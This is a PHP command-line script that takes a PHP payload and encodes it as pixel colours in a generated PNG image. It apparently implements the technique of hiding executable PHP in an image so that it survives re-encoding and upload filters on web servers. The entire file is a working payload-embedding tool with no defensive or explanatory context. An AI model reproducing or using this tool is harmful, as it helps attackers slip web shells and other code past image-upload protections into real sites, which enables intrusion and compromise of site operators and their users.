<?php

// Check if the correct number of command-line arguments is provided
if (count($argv) != 3) {
    exit("Usage: $argv[0] <PHP payload> <Output file>");
}

// Retrieve PHP payload and output file from command-line arguments
$_payload = $argv[1];
$output = $argv[2];

// Pad the payload with spaces until its length is divisible by 3
while (strlen($_payload) % 3 != 0) {
    $_payload .= " ";
}

// Get the length of the payload
$_pay_len = strlen($_payload);

// Check if the payload length is within acceptable limits
if ($_pay_len > 256 * 3) {
    echo "FATAL: The payload is too long. Exiting...";
    exit();
}
if ($_pay_len % 3 != 0) {
    echo "FATAL: The payload isn't divisible by 3. Exiting...";
    exit();
}

// Calculate the width and height for the image
$width = $_pay_len / 3;
$height = 20;

// Create an image with specified width and height
$im = imagecreate($width, $height);

// Convert payload to hexadecimal representation
$_hex = unpack('H*', $_payload);

// Split the hexadecimal representation into chunks of 6 characters
$_chunks = str_split($_hex[1], 6);

// Loop through each chunk and set pixel colors in the image
for ($i = 0; $i < count($_chunks); $i++) {
    // Split the 6-character chunk into individual color components
    $_color_chunks = str_split($_chunks[$i], 2);
    
    // Allocate a color in the image using RGB values
    $color = imagecolorallocate($im, hexdec($_color_chunks[0]), hexdec($_color_chunks[1]), hexdec($_color_chunks[2]));
    
    // Set the pixel color in the image
    imagesetpixel($im, $i, 1, $color);
}

// Save the image as a PNG file
imagepng($im, $output);
